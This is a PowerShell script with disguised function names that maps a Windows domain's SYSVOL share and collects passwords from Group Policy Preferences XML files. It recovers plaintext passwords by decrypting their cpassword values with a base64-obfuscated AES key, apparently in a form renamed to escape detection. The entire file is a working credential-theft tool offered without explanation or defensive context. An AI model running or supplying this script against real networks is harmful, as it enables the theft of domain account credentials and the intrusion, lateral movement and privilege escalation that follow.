function Get-Stuff {
    
    [CmdletBinding()]
    Param (
            [ValidateNotNullOrEmpty()]
            [String]
            $Server = $Env:USERDNSDOMAIN,
	    [String]
            $creds
    )
    $cred = $creds
    #Some XML issues between versions
    Set-StrictMode -Version 2
    
    #define helper function that decodes and decrypts password
    function Get-DCWD {
        [CmdletBinding()]
        Param (
            [string] $CPWD 
        )

        try {
            #Append appropriate padding based on string length  
            $Mod = ($CPWD.length % 4)
            
            switch ($Mod) {
            '1' {$CPWD = $CPWD.Substring(0,$CPWD.Length -1)}
            '2' {$CPWD += ('=' * (4 - $Mod))}
            '3' {$CPWD += ('=' * (4 - $Mod))}
            }

            $Base64Decoded = [Convert]::FromBase64String($CPWD)
            
            #Create a new AES .NET Crypto Object
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
	    $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
	    [Byte[]] $AesKey = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHg0ZSwweDk5LDB4MDYsMHhlOCwweGZjLDB4YjYsMHg2YywweGM5LDB4ZmEsMHhmNCwweDkzLDB4MTAsMHg2MiwweDBmLDB4ZmUsMHhlOCwweGY0LDB4OTYsMHhlOCwweDA2LDB4Y2MsMHgwNSwweDc5LDB4OTAsMHgyMCwweDliLDB4MDksMHhhNCwweDMzLDB4YjYsMHg2YywweDFi"))).Split(",")
            
            
            #Set IV to all nulls to prevent dynamic generation of IV value
            $AesIV = New-Object Byte[]($AesObject.IV.Length) 
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DXPSObject = $AesObject.CreateDecryptor() 
            [Byte[]] $OutBlock = $DXPSObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            
            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        } 
        
        catch {Write-Error $Error[0]}
    }  
    
    #define helper function to parse fields from xml files
    function Get-GPPIFS {
    [CmdletBinding()]
        Param (
            $File
        )
    
        try {
            
            $Filename = Split-Path $File -Leaf
            [xml] $Xml = Get-Content ($File)

            $CPWD = @()
            $UserName = @()
            $NewName = @()
            $Changed = @()
            $Password = @()
    
            if ($Xml.innerxml -like "*cpassword*"){
            
                Write-Verbose "Potential password in $File"
                
                switch ($Filename) {

                    'Groups.xml' {
                        $CPWD += , $Xml | Select-Xml "/Groups/User/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Groups/User/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $NewName += , $Xml | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Groups/User/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'Services.xml' {  
                        $CPWD += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'Scheduledtasks.xml' {
                        $CPWD += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
        
                    'DataSources.xml' { 
                        $CPWD += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}                          
                    }
                    
                    'Printers.xml' { 
                        $CPWD += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
  
                    'Drives.xml' { 
                        $CPWD += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                    }
                }
           }
                     
           foreach ($Pass in $CPWD) {
               Write-Verbose "Decrypting $Pass"
               $DPWDyptedPassword = Get-DCWD $Pass
               Write-Verbose "Decrypted a password of $DPWDyptedPassword"
               #append any new passwords to array
               $Password += , $DPWDyptedPassword
           }
            
            #put [BLANK] in variables
            if (!($Password)) {$Password = '[BLANK]'}
            if (!($UserName)) {$UserName = '[BLANK]'}
            if (!($Changed)) {$Changed = '[BLANK]'}
            if (!($NewName)) {$NewName = '[BLANK]'}
                  
            #Create custom object to output results
            $ObjectProperties = @{'Passwords' = $Password;
                                  'UserNames' = $UserName;
                                  'Changed' = $Changed;
                                  'NewName' = $NewName;
                                  'File' = $File}
                
            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
            Write-Verbose "The password is between {} and may be more than one value."
            if ($ResultsObject) {Return $ResultsObject} 
        }

        catch {Write-Error $Error[0]}
    }
    
    try {
        #discover potential files containing passwords ; not complaining in case of denied access to a directory
        Write-Verbose "Searching \\$Server\SYSVOL. This could take a while."
	#Get unused drive letter for mapping drives
        $drvlist=(Get-PSDrive -PSProvider filesystem).Name
        Foreach ($drvletter in "DEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray()) {
            If ($drvlist -notcontains $drvletter) {
                $drv=$drvletter
            }
        }
	New-PSDrive -Name $drv -Root "\\$Server\SYSVOL" -PSProvider "FileSystem" -Credential $cred | out-null
	$tpath = $null
        $tpath = $drv + ":"
        $XMlFiles = Get-ChildItem -Path $tpath -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'
    	Get-PSDrive $drv | Remove-PSDrive
        if ( -not $XMlFiles ) {throw 'No preference files found.'}

        Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
    
        foreach ($File in $XMLFiles) {
            $Result = (Get-GPPIFS $File.Fullname)
            Write-Output $Result
        }
    }

    catch {Write-Error $Error[0]}
}
